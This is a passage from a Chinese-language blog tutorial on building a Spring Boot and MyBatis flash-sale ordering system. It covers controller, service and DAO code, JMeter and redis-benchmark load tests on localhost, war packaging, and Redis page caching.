List&lt;GoodsVo&gt; <span class="hljs-title">listGoodsVo</span><span class="hljs-params">()</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-3-商品详情页"><a href="#3-3-商品详情页" class="headerlink" title="3.3 商品详情页"></a>3.3 商品详情页</h2><p>商品详情页所展示的信息仍然是GoodsVo，在GoodsController中添加方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/to_detail/&#123;goodsId&#125;&quot;)</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">detail</span><span class="hljs-params">(Model model, MiaoshaUser user,</span></span><br><span class="hljs-function"><span class="hljs-params">                     <span class="hljs-meta">@PathVariable(&quot;goodsId&quot;)</span>Long goodsId)</span></span>&#123;<br>    model.addAttribute(<span class="hljs-string">&quot;user&quot;</span>,user);<br>    <span class="hljs-comment">//查询商品详情</span><br>    GoodsVo goods = goodsService.getGoodsVoByGoodsId(goodsId);<br>    model.addAttribute(<span class="hljs-string">&quot;goods&quot;</span>,goods);<br><br>    <span class="hljs-keyword">long</span> startAt = goods.getStartDate().getTime();<br>    <span class="hljs-keyword">long</span> endAt = goods.getEndDate().getTime();<br>    <span class="hljs-keyword">long</span> now = System.currentTimeMillis();<br><br>    <span class="hljs-keyword">int</span> miaoshaStatus = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> remainSeconds = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (now &lt; startAt)&#123;<br>        <span class="hljs-comment">//秒杀未开始，倒计时</span><br>        miaoshaStatus = <span class="hljs-number">0</span>;<br>        remainSeconds = (<span class="hljs-keyword">int</span>)(startAt - now) / <span class="hljs-number">1000</span>;<br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(now &gt; endAt)&#123;<br>        <span class="hljs-comment">//秒杀已经结束</span><br>        miaoshaStatus = <span class="hljs-number">2</span>;<br>        remainSeconds = -<span class="hljs-number">1</span>;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">//秒杀正在进行</span><br>        miaoshaStatus = <span class="hljs-number">1</span>;<br>        remainSeconds = <span class="hljs-number">0</span>;<br>    &#125;<br>    model.addAttribute(<span class="hljs-string">&quot;miaoshaStatus&quot;</span>, miaoshaStatus);<br>    model.addAttribute(<span class="hljs-string">&quot;remainSeconds&quot;</span>, remainSeconds);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;goods_detail&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>GoodsService添加方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> GoodsVo <span class="hljs-title">getGoodsVoByGoodsId</span><span class="hljs-params">(Long goodsId)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> goodsDao.getGoodsVoByGoodsId(goodsId);<br>&#125;<br></code></pre></td></tr></table></figure><p>GoodsDao中添加方法:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Select(&quot;select g.*,mg.stock_count,mg.start_date,mg.end_date,mg.miaosha_price from miaosha_goods mg left join goods g on mg.goods_id = g.id where g.id = #&#123;goodsId&#125;&quot;)</span><br><span class="hljs-function"><span class="hljs-keyword">public</span>  GoodsVo <span class="hljs-title">getGoodsVoByGoodsId</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;goodsId&quot;)</span> Long goodsId)</span></span>;<br></code></pre></td></tr></table></figure><p>秒杀功能实现：</p><p>点击商品详情页的；立即秒杀按钮会跳转到“/miaosha/do_miaosha”,编写MiaoshaController：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br><span class="hljs-meta">@RequestMapping(&quot;/miaosha&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MiaoshaController</span> </span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Logger log = LoggerFactory.getLogger(MiaoshaController.class);<br><br>    <span class="hljs-meta">@Autowired</span><br>    GoodsService goodsService;<br><br>    <span class="hljs-meta">@Autowired</span><br>    OrderService orderService;<br><br>    <span class="hljs-meta">@Autowired</span><br>    MiaoshaService miaoshaService;<br><br>    <span class="hljs-meta">@RequestMapping(&quot;/do_miaosha&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">list</span><span class="hljs-params">(Model model, MiaoshaUser user,</span></span><br><span class="hljs-function"><span class="hljs-params">                       <span class="hljs-meta">@RequestParam(&quot;goodsId&quot;)</span><span class="hljs-keyword">long</span> goodsId)</span></span>&#123;<br>        model.addAttribute(<span class="hljs-string">&quot;user&quot;</span>,user);<br>        <span class="hljs-keyword">if</span> (user == <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;login&quot;</span>;<br>        &#125;<br>        <span class="hljs-comment">//判断库存</span><br>        GoodsVo goods = goodsService.getGoodsVoByGoodsId(goodsId);<br>        <span class="hljs-keyword">int</span> stock = goods.getStockCount();<br>        <span class="hljs-keyword">if</span> (stock &lt;= <span class="hljs-number">0</span>)&#123;<br>            model.addAttribute(<span class="hljs-string">&quot;errmsg&quot;</span>, CodeMsg.MIAO_SHA_OVER.getMsg());<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;miaosha_fail&quot;</span>;<br>        &#125;<br>        <span class="hljs-comment">//判断是否已经秒杀到了</span><br>        MiaoshaOrder order = orderService.getMiaoshaOrderByUserIdAndGoodsId(user.getId(),goodsId);<br>        <span class="hljs-keyword">if</span> (order != <span class="hljs-keyword">null</span>)&#123;<br>            model.addAttribute(<span class="hljs-string">&quot;errmsg&quot;</span>,CodeMsg.REPEATE_MIAOSHA.getMsg());<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;miaosha_fail&quot;</span>;<br>        &#125;<br>        <span class="hljs-comment">//减库存 下订单 写入秒杀订单</span><br>        OrderInfo orderInfo = miaoshaService.miaosha(user,goods);<br>        model.addAttribute(<span class="hljs-string">&quot;orderInfo&quot;</span>,orderInfo);<br>        model.addAttribute(<span class="hljs-string">&quot;goods&quot;</span>,goods);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;order_detail&quot;</span>;<br>    &#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p>这里面涉及到三个service，分别是 GoodsService，OrderService，MiaoshaService</p><ol><li><p>GoodsService中已经有getGoodsVoByGoodsId()方法</p></li><li><p>OrderService中添加getMiaoshaOrderByUserIdAndGoodsId()方法</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> MiaoshaOrder <span class="hljs-title">getMiaoshaOrderByUserIdAndGoodsId</span><span class="hljs-params">(<span class="hljs-keyword">long</span> userId, <span class="hljs-keyword">long</span> goodsId)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> orderDao.getMiaoshaOrderByUserIdAndGoodsId(userId, goodsId);<br>&#125;<br></code></pre></td></tr></table></figure><p>在OrderService中添加方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Select(&quot;select * from miaosha_order where user_id = #&#123;userId&#125; and goods_id = #&#123;goodsId&#125;&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> MiaoshaOrder <span class="hljs-title">getMiaoshaOrderByUserIdAndGoodsId</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;userId&quot;)</span><span class="hljs-keyword">long</span> userId, <span class="hljs-meta">@Param(&quot;goodsId&quot;)</span><span class="hljs-keyword">long</span> goodsId)</span></span>;<br></code></pre></td></tr></table></figure><ol><li>上面步骤说明满足秒杀条件，MiaoshaService中编写miaosha()方法，该方法应该声明为事务,值得注意的是Service方法中一般引入自己同名相应的Dao，如果引用别的Dao方法应该直接引入对应的Service方法，比如这里引入的GoodsService而不是GoodsDao</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Service</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MiaoshaService</span> </span>&#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    GoodsService goodsService;<br><br>    <span class="hljs-meta">@Autowired</span><br>    OrderService orderService;<br><br>    <span class="hljs-meta">@Transactional</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> OrderInfo <span class="hljs-title">miaosha</span><span class="hljs-params">(MiaoshaUser user, GoodsVo goods)</span> </span>&#123;<br>        <span class="hljs-comment">//减库存</span><br>        goodsService.reduceStock(goods);<br>        <span class="hljs-comment">//生成订单</span><br>        <span class="hljs-keyword">return</span> orderService.createOrder(user,goods);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>miaosha()里面有两个方法，在goodsService方法中添加：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">reduceStock</span><span class="hljs-params">(GoodsVo goods)</span> </span>&#123;<br>    MiaoshaGoods g = <span class="hljs-keyword">new</span> MiaoshaGoods();<br>    g.setGoodsId(goods.getId());<br>    goodsDao.reduceStock(g);<br>&#125;<br><br> MiaoshaGoods:<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MiaoshaGoods</span> </span>&#123;<br><br>    <span class="hljs-keyword">private</span> Long id;<br>    <span class="hljs-keyword">private</span> Long goodsId;<br>    <span class="hljs-keyword">private</span> Integer stockCount;<br>    <span class="hljs-keyword">private</span> Double miaoshaPrice;<br>    <span class="hljs-keyword">private</span> Date startDate;<br>    <span class="hljs-keyword">private</span> Date endDate;<br>    <br>    <span class="hljs-comment">//getter and setter</span><br>&#125;<br></code></pre></td></tr></table></figure><p>goodsDao中的reduceStock()：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Update(&quot;update miaosha_goods set stock_count = stock_count - 1 where goods_id = #&#123;goodsId&#125;&quot;)</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">reduceStock</span><span class="hljs-params">(MiaoshaGoods g)</span></span>;<br></code></pre></td></tr></table></figure><p>orderService中添加createOrder：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Transactional</span><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> OrderInfo <span class="hljs-title">createOrder</span><span class="hljs-params">(MiaoshaUser user, GoodsVo goods)</span> </span>&#123;<br>       OrderInfo orderInfo = <span class="hljs-keyword">new</span> OrderInfo();<br>       orderInfo.setCreateDate(<span class="hljs-keyword">new</span> Date());<br>       orderInfo.setDeliveryAddrId(<span class="hljs-number">0L</span>);<br>       orderInfo.setGoodsCount(<span class="hljs-number">1</span>);<br>       orderInfo.setGoodsId(goods.getId());<br>       orderInfo.setGoodsName(goods.getGoodsName());<br>       orderInfo.setGoodsPrice(goods.getMiaoshaPrice());<br>       orderInfo.setOrderChannel(<span class="hljs-number">1</span>);<br>       orderInfo.setStatus(<span class="hljs-number">0</span>);<br>       orderInfo.setUserId(user.getId());<br>       <span class="hljs-keyword">long</span> orderId = orderDao.insert(orderInfo);<br>       MiaoshaOrder miaoshaOrder = <span class="hljs-keyword">new</span> MiaoshaOrder();<br>       miaoshaOrder.setGoodsId(goods.getId());<br>       miaoshaOrder.setOrderId(orderId);<br>       miaoshaOrder.setUserId(user.getId());<br><br>       orderDao.insertMiaoshaOrder(miaoshaOrder);<br>       <span class="hljs-keyword">return</span>  orderInfo;<br>   &#125;<br></code></pre></td></tr></table></figure><p>orderDao中的insertMiaoshaOrder()方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Insert(&quot;insert into miaosha_order (user_id, goods_id, order_id)values(#&#123;userId&#125;, #&#123;goodsId&#125;, #&#123;orderId&#125;)&quot;)</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">insertMiaoshaOrder</span><span class="hljs-params">(MiaoshaOrder miaoshaOrder)</span></span>;<br></code></pre></td></tr></table></figure><p>这里为什么只修改秒杀商品表库存而不修改商品表库存呢？</p><h2 id="3-4-订单详情页"><a href="#3-4-订单详情页" class="headerlink" title="3.4 订单详情页"></a>3.4 订单详情页</h2><p>编写相应的thymeleaf模板</p><h1 id="4-JMeter压测"><a href="#4-JMeter压测" class="headerlink" title="4. JMeter压测"></a>4. JMeter压测</h1><h2 id="4-1-JMeter入门"><a href="#4-1-JMeter入门" class="headerlink" title="4.1 JMeter入门"></a>4.1 JMeter入门</h2><p>启动JMeter后添加线程组，设置线程属性：</p><ul><li>线程数：1000(太少吞吐量达不到性能瓶颈)</li><li>Ramp-Up时间：0（线程同时启动，设置为10则是线程组在10秒内启动）</li><li>循环次数：1（线程组测试多少次）</li></ul><p>在线程组下设置：</p><ul><li>HTTP请求默认值<ul><li>协议：http</li><li>服务器名称或IP：localhost</li><li>端口号：8080</li></ul></li><li>HTTP请求<ul><li>名称：商品列表</li><li>请求方式：GET</li><li>路径：goods/to_list</li></ul></li><li>聚合报告</li></ul><p>聚合报告显示吞吐量468/s</p><p>测试时若mysql在linux上使用top命令观察各进程情况，在windows上使用任务管理器，发现mysql占用资源最多，应该为当前的性能瓶颈。</p><h2 id="4-2-自定义变量模拟多用户"><a href="#4-2-自定义变量模拟多用户" class="headerlink" title="4.2 自定义变量模拟多用户"></a>4.2 自定义变量模拟多用户</h2><p>在线程组下添加一个HTTP请求：</p><p>HTTP请求</p><ul><li>名称：获取用户信息</li><li>请求方式：GET</li><li>路径：/user/info</li><li>参数：<ul><li>名称：token，值：a2a8a05fa0eb4b2f8f028e704de2f577</li></ul></li></ul><p>禁用原来的商品列表请求，现在的获取用户信息吞吐量667.1/s，因为现在只需要查redis不需要查mysql</p><p>现在只使用了一个token，也就是单用户，下面创建多用户，添加配置元件CSVDataSetConfig：</p><ul><li>文件名：F:/QQPCmgr/Desktop/config.txt</li><li>变量名称：userId,userToken</li><li>编写config.txt：<ul><li>userid1,a2a8a05fa0eb4b2f8f028e704de2f577</li></ul></li></ul><h2 id="4-3-JMeter命令行使用"><a href="#4-3-JMeter命令行使用" class="headerlink" title="4.3 JMeter命令行使用"></a>4.3 JMeter命令行使用</h2><ol><li><p>在windows上录好jmx</p><p>把windows上的jmx保存上传到linux</p></li><li><p>命令行：sh jmeter.sh -n -t XXX.jmx -l result.jtl</p></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">apache-jmeter-5.4/bin/jmeter.sh -n -t goods_list.jmx -l result.jtl<br></code></pre></td></tr></table></figure><ol><li>使用top命令观察压测情况</li></ol><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">top</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">06</span><span class="hljs-selector-pseudo">:40</span><span class="hljs-selector-pseudo">:42</span> <span class="hljs-selector-tag">up</span>  <span class="hljs-selector-tag">3</span><span class="hljs-selector-pseudo">:31</span>,  <span class="hljs-selector-tag">2</span> <span class="hljs-selector-tag">users</span>,  <span class="hljs-selector-tag">load</span> <span class="hljs-selector-tag">average</span>: <span class="hljs-selector-tag">11</span><span class="hljs-selector-class">.09</span>, <span class="hljs-selector-tag">4</span><span class="hljs-selector-class">.46</span>, <span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.57</span><br>占用最多的进程是两个<span class="hljs-selector-tag">java</span>(项目和jemeter)和<span class="hljs-selector-tag">mysql</span><br></code></pre></td></tr></table></figure><ol><li>把result.jtl导入到jmeter</li></ol><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">qps</span>为<span class="hljs-number">897</span>.<span class="hljs-number">9</span>/s<br></code></pre></td></tr></table></figure><h2 id="4-4-Redis压测工具redis-benchmark"><a href="#4-4-Redis压测工具redis-benchmark" class="headerlink" title="4.4 Redis压测工具redis-benchmark"></a>4.4 Redis压测工具redis-benchmark</h2><p>redis做压测可以使用自带的redis-benchmark工具</p><p>在linux使用终端命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">100个并发，100000个请求</span><br>redis-benchmark -h 127.0.0.1 -p 6379 -c 100 -n 100000<br></code></pre></td></tr></table></figure><p>得到结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">====== GET ======<br>  100000 requests completed in 1.79 seconds<br>  100 parallel clients<br>  3 bytes payload<br>  keep alive: 1<br></code></pre></td></tr></table></figure><p>使用终端命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">存取大小为100字节的数据包</span><br>redis-benchmark -h 127.0.0.1 -p 6379 -q -d 100<br></code></pre></td></tr></table></figure><p>得到结果：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell">PING_INLINE: 54141.85 requests per second<br>PING_BULK: 68212.83 requests per second<br>SET: 78247.26 requests per second<br>GET: 79302.14 requests per second<br>INCR: 69348.12 requests per second<br>LPUSH: 78926.60 requests per second<br>RPUSH: 78369.91 requests per second<br>LPOP: 79239.30 requests per second<br>RPOP: 80128.20 requests per second<br>SADD: 79744.82 requests per second<br>HSET: 78554.59 requests per second<br>SPOP: 78740.16 requests per second<br>LPUSH (needed to benchmark LRANGE): 78369.91 requests per second<br>LRANGE_100 (first 100 elements): 78308.54 requests per second<br>LRANGE_300 (first 300 elements): 78186.08 requests per second<br>LRANGE_500 (first 450 elements): 79365.08 requests per second<br>LRANGE_600 (first 600 elements): 78492.93 reque<br></code></pre></td></tr></table></figure><p>使用终端命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">测试单个语句性能</span><br>redis-benchmark -n 100000 -q script load &quot;redis.call(&#x27;set&#x27;,&#x27;foo&#x27;,&#x27;bar&#x27;)&quot;<br></code></pre></td></tr></table></figure><p>得到结果：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">script load redis.call(&#x27;set&#x27;,&#x27;foo&#x27;,&#x27;bar&#x27;): 66093.85 requests per second<br></code></pre></td></tr></table></figure><h2 id="4-5-SpringBoot打war包"><a href="#4-5-SpringBoot打war包" class="headerlink" title="4.5 SpringBoot打war包"></a>4.5 SpringBoot打war包</h2><ol><li>添加spring-boot-starter-tomcat的provided依赖</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>provided<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><ol><li>添加maven-war-plugin插件</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">finalName</span>&gt;</span>$&#123;project.artifactId&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">finalName</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>               <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>               <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-war-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>               <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>                   <span class="hljs-tag">&lt;<span class="hljs-name">failOnMissingWebXml</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">failOnMissingWebXml</span>&gt;</span><br>               <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br>           <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>       <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br></code></pre></td></tr></table></figure><ol><li>修改启动类MainApplication</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@SpringBootApplication</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MainApplication</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">SpringBootServletInitializer</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        SpringApplication.run(MainApplication.class,args);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> SpringApplicationBuilder <span class="hljs-title">configure</span><span class="hljs-params">(SpringApplicationBuilder builder)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> builder.sources(MainApplication.class);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol><li>在终端 E:\ideawork\miaosha_4打包命令</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">E:\ideawork\miaosha_4&gt;mvn clean package<br></code></pre></td></tr></table></figure><ol><li>打包后将miaosha_4.war移动到tomcat的websapp下面并启动tomcat</li></ol><h1 id="5-页面优化技术"><a href="#5-页面优化技术" class="headerlink" title="5. 页面优化技术"></a>5. 页面优化技术</h1><h2 id="5-1-页面缓存-URL缓存-对象缓存"><a href="#5-1-页面缓存-URL缓存-对象缓存" class="headerlink" title="5.1 页面缓存+URL缓存+对象缓存"></a>5.1 页面缓存+URL缓存+对象缓存</h2><h3 id="5-1-1页面缓存"><a href="#5-1-1页面缓存" class="headerlink" title="5.1.1页面缓存"></a>5.1.1页面缓存</h3><p>页面缓存，这里使用的是浏览器缓存技术（第二次访问有效）</p><p>首先修改访问原来的list逻辑，增加了注解@ResponseBody，先尝试在redis取缓存，没有的话就生成缓存并存到redis中，以前是直接返回goods_list交给thymeleaf渲染解析，这里先使用thymeleafViewResolver解析为成品代码返回，再将成品代码存到redis中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(value = &quot;/to_list&quot;,produces = &quot;text/html&quot;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">list</span><span class="hljs-params">(HttpServletRequest request,HttpServletResponse response, Model model, MiaoshaUser user)</span></span>&#123;<br><br>        model.addAttribute(<span class="hljs-string">&quot;user&quot;</span>,user);<br>        <span class="hljs-comment">//查询商品列表</span><br>        List&lt;GoodsVo&gt; goodsList = goodsService.listGoodsVo();<br>        model.addAttribute(<span class="hljs-string">&quot;goodsList&quot;</span>,goodsList);<br><span class="hljs-comment">//        return 